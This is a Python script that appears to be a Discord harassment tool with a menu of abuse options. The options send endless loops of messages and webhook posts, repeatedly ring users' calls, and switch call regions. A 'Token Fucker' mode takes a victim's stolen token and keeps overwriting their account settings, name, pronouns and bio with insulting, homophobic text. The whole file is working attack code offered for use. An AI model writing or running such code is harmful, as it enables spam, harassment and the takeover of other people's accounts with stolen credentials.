import random,requests,platform,os,time
from bs4 import BeautifulSoup

others = """
[1] Message spammer

[2] User Lookup

[3] Webhook spammer

[4] Call spammer (Everyone in group)

[5] Call spammer (Specific Person In Group)

[6] Token Fucker

[7] Call 'Stresser'
"""
def clear():
  if platform.system() == 'windows':
    os.system('cls')
  else:
    os.system('clear')
def main():
    clear()
    print(others)
    lol = input('/>')
    if lol == '1':
           token = input('enter your discord token:')
           api = input('enter channel id:')
           msg = input('msg:')
           payload = {
            'content':msg
            }
           header = {
         'authorization':token

            }
           while True:
            r = requests.post(f'https://discord.com/api/v9/channels/{api}/messages',data=payload,headers=header)


    if lol == '2':
        print('please enter the users discord id')
        l = input('::')
        r = requests.get(f'https://discordlookup.com/user/{l}')
        soup = BeautifulSoup(r.text,'html.parser')
        con = soup.find_all('div',class_='small')
        print(con)
        lol = soup.find_all('b')
        print(lol)
    if lol == '3':
     webhook = input('webhook:')
     msg = input('msg:')
     payload = {
      'content':msg
     }
     while True:
      r = requests.post(webhook,data=payload)
    if lol == '4':   
     print('YOU MUST BE IN A CALL FIRST FOR THIS TO WORK!!')
     tok = input('discord token:')
     heade = {
    'authorization':tok
   }
     id = input('channel id:')
     while True:
      r = requests.post(f'https://discord.com/api/v9/channels/{id}/call/ring',headers=heade)     
    if lol == '5':
     print('YOU MUST BE IN A CALL FIRST FOR THIS TO WORK!!')
     token = input('token:')
     User_Id = input('User id:')
     channelid = input('channel id:')
     headers = {
        "Authorization": token
    }
     payload = {
        "recipients": [f"{User_Id}"]
    }
     url = f"https://discord.com/api/v9/channels/{channelid}/call/ring"
     while True:
      r = requests.post(url, headers=headers, json=payload)  
    if lol =='6':
     token = input('victims token:')
     lang = ["YgsKBAoCZnISAwisAg==","Yg4KBwoFZXMtRVMSAwisAg==","YgsKBAoCaXQSAwisAg==","Yg4KBwoFemgtVFcSAwisAg==","YgsKBAoCa28SAwisAg==","YgsKBAoCdWsSAwisAg=="]

     lol = random.choice(lang)
     hea = {
    'authorization':token
}
     payload = {
    "settings":lol
}
     payload1 = {
 "settings":'EgIIAmoGCAIQARoA'
}
     payload2 = {
 'settings':'MgWKAQIIAQ=="'
}
     payload3 = {
 'global_name':'I_WAS_PWNED!'
}
     payload4 = {
 'pronouns':'IM_GAYYYYY'
}
     payload5 = {
 'bio':'GET PWNED SKID'
}
     def fuck():
      r = requests.patch('https://discord.com/api/v9/users/@me/settings-proto/1',headers=hea,json=payload)

     def frick():
      q = requests.patch('https://discord.com/api/v9/users/@me/settings-proto/1',headers=hea,json=payload1)

     def fux():
      w = requests.patch('https://discord.com/api/v9/users/@me/settings-proto/1',headers=hea,json=payload2)
 
     def trans():
      g = requests.patch('https://discord.com/api/v9/users/@me',headers=hea,json=payload3)

     def loli():
      h = requests.patch('https://discord.com/api/v9/users/%40me/profile',headers=hea,json=payload4)

     def bio():
      g = requests.patch('https://discord.com/api/v9/users/%40me/profile',headers=hea,json=payload5)
     while True:
      fuck()
      frick()
      fux()
      trans()
      loli()
      bio()
      time.sleep(1)
    if lol == '7':
       print('OBVIOUSLY YOU MUST BE IN THE CALL FOR THIS TO WORK!')
       id = input('channel id:')
       token = input('discord token:')
       while True:
        reg = ['hongkong','singapore','sydney','india','rotterdam','southafrica','us-central','japan']
        lol = random.choice(reg)

        hea = {
    'authorization':token
}
        payload = {
    'region':lol
}
        time.sleep(2)
        r = requests.patch(f'https://discord.com/api/v9/channels/{id}/call',headers=hea,json=payload)
    if lol =='99':
       clear()
       main()
while True:
 main() 
 if KeyboardInterrupt() == True:
   main()